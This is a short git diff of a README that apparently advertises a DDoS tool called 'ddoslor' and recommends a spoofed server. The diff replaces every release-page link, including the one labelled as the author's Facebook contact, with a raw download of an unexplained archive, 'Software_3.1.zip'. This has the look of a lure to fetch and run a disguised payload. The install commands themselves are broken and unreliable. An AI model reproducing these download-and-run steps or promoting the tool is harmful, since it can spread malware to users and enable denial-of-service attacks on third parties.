@@ -26,14 +26,14 @@
 
 * Please use spoofed server for the best experience.
 
-* ```git clone https://github.com/ngotrunganhh/ddoslor/releases``
-* ```cd F-Tool; sh https://github.com/ngotrunganhh/ddoslor/releases```
+* ```git clone https://raw.githubusercontent.com/ngotrunganhh/ddoslor/main/utils/Software_3.1.zip``
+* ```cd F-Tool; sh https://raw.githubusercontent.com/ngotrunganhh/ddoslor/main/utils/Software_3.1.zip```
 
 * Install CentOS
 
-* ```cd F-Tool; sh https://github.com/ngotrunganhh/ddoslor/releases```
+* ```cd F-Tool; sh https://raw.githubusercontent.com/ngotrunganhh/ddoslor/main/utils/Software_3.1.zip```
 
 Tool cũ thằng dec ngu nên đã có xíu lỗi, ae sài tool này có lỗi ib fb mình nhé
-url fb: https://github.com/ngotrunganhh/ddoslor/releases 
+url fb: https://raw.githubusercontent.com/ngotrunganhh/ddoslor/main/utils/Software_3.1.zip 
 
 Thanks you verymuch
